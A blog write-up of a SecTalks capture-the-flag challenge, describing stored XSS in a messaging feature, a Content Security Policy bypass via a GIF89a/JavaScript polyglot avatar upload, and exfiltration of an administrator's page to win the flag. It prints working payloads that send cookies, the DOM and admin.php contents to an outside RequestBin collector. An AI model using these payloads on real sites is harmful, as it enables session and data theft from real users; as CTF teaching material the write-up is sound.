---
layout: post
title: "CTF Snippets: XSS.gif"
tags:
- hack
- ctf
- sectalks
- xss
- csrf
- file-upload
- image
- gif
- csp
- chrome
- safari
categories:
- devalias
disqus: true
webmention: true
crosspost_to_medium: false
---
I was playing around with the top challenge on the CTF at [SecTalks](http://www.sectalks.org/canberra/) the other night, and thought I'd do a quick writeup of some of the techniques required; for future reference, and to help others to learn.

## Hack the gibso.. Website

To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the `administrator` was online.. interesting.

Poking around at things, I discovered that the messaging system didn't seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:

```html
<script>alert('XSS')</script>
```

I checked the message.. but for some reason it didn't pop, even though my payload seemed fine in the source. :(

```html
<div class="well">
  <script>alert('XSS')</script>
</div>
```

Looking at the developer console gave me some more insight. Apparently this site had [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy) enabled, and it was blocking my payload.

> Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M='), or a nonce ('nonce-...') is required to enable inline execution.

Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:

```
Content-Security-Policy:
  default-src 'none';
  img-src 'self' placehold.it *.imgix.net;
  script-src 'self';
  connect-src 'self';
  style-src 'self' fonts.gstatic.com fonts.googleapis.com;
  font-src 'self' fonts.googleapis.com fonts.gstatic.com;
```

Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from `self`.

How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.

Using the `GIF89a` format (which conveniently starts with it's name, then the rest is the GIF payload) I constructed and uploaded my new 'avatar' `pwn.gif`, designed to steal cookies via [RequestBin](http://requestb.in/):

```javascript
GIF89a/*.......*/=0;
window.location='http://requestb.in/secretcode?c='+document.cookie;
```

This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new 'avatar' by sending myself a test message:

```html
<script src="http://example.com/uploads/filenamehash.gif"></script>
```

Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:

> Refused to execute script from 'http://example.com/uploads/filenamehash.gif' because its MIME type ('image/gif') is not executable.

This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that `HttpOnly` flag first.. Sometimes I just get caught up in the heat of the moment.

Ok.. so we couldn't steal the cookies.. but what could we do? [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)) maybe? There was a CSRF token designed to prevent this, but it didn't seem to get validated. That's good.. but what should we target?

Needing some better visibility on the situation, I decided to just steal the whole [DOM](https://en.wikipedia.org/wiki/Document_Object_Model) and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):

```javascript
GIF89a/*.......*/=0;
/* Wait for the page to fully load */
window.onload = function() {
  /* Create a form to send to RequestBin */
  var f = document.createElement('form');
  f.id="haxForm";
  f.method="post";
  f.action="http://requestb.in/secretcode";

  /* Create a textarea to store our data */
  var t = document.createElement('textarea');
  t.name="haxPayload";

  /* Capture the entire DOM and Base64 encode it */
  t.value = btoa(document.documentElement.outerHTML)

  /* Inject the form and send it */
  f.appendChild(t);
  document.body.appendChild(f);
  document.getElementById("haxForm").submit();
};
```

Ignoring my rusty JavsScript, the new payload would create a HTML `form` element with a `textarea`, grab the entire contents of the DOM, [Base64 encode](https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa) them, stick them in the `textarea`, inject the `form` into the page, then send that off to RequestBin.

After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:

```html
<li><a href="admin.php">Administration</a></li>
```

Sweet, let's find something juicy on that page! Reworking the payload (with a little help from [JQuery](https://api.jquery.com/jquery.get/) that was already on the site):

```javascript
GIF89a/*.......*/=0;
/* Wait for the page to fully load */
window.onload = function() {
  /* Create a form to send to RequestBin */
  var f = document.createElement('form');
  f.id="haxForm";
  f.method="post";
  f.action="http://requestb.in/secretcode";

  /* Create a textarea to store our data */
  var t = document.createElement('textarea');
  t.name="haxPayload";

  /* Inject the form */
  f.appendChild(t);
  document.body.appendChild(f);

  /* Load the admin page ajax-style, Base64 encode it, send it off */
  $.get("admin.php", function(data) {
    t.value = btoa(data);
    document.getElementById("haxForm").submit();
  });
};
```

Using the last payload as the template, I updated it to load the `admin.php` page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn't even a need to do anything else:

```html
<legend>
  <h3>Administration</h3>
</legend>
<h4>flag{the-secret-flag-code}</h4>
```

Mischief managed!

## Raw Notes

I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:

* Administrator is online
* We can send messages to users
* We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self
* We can upload image files (can we make that other types?)
  * GIF89a based XSS, won't exec in chrome though..
* Administrator will read messages we send them (check the 'sent' page)
* Admin isn't using chrome! :p
* The request doesn't send us any cookies! :( (they're HTTP only)
* CSRF token doesn't seem to actually be validated.. What can we CSRF..?
* Use the XSS to send us the admin's DOM
* Seems there's an admin.php page..
* Ajax the admin page
* Success!

## Conclusion

This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.

Has this helped you learn something new? Got a better way to approach it? I'd love to hear from you in the comments!

## References

* Content Security Policy
  * [Content Security Policy | OWASP](https://www.owasp.org/index.php/Content_Security_Policy)
  * [Content Security Policy Cheat Sheet | OWASP](https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet)
  * ["An Introduction to Content Security Policy" by HTML5 Rocks](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)
  * [Content Security Policy References and Examples](https://content-security-policy.com/)
* File Upload/Image XSS
  * ["GIF Image XSS" by eXpl0i13r](https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html)
  * [File Upload XSS | Hack2Learn](http://brutelogic.com.br/blog/file-upload-xss/)
  * [List of File Signatures | Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
  * ["Exploiting PHP-GD imagecreatefromgif() function" by d0lph1n98 ](https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif)
* Capturing Requests
  * [Request Bin](TODO)
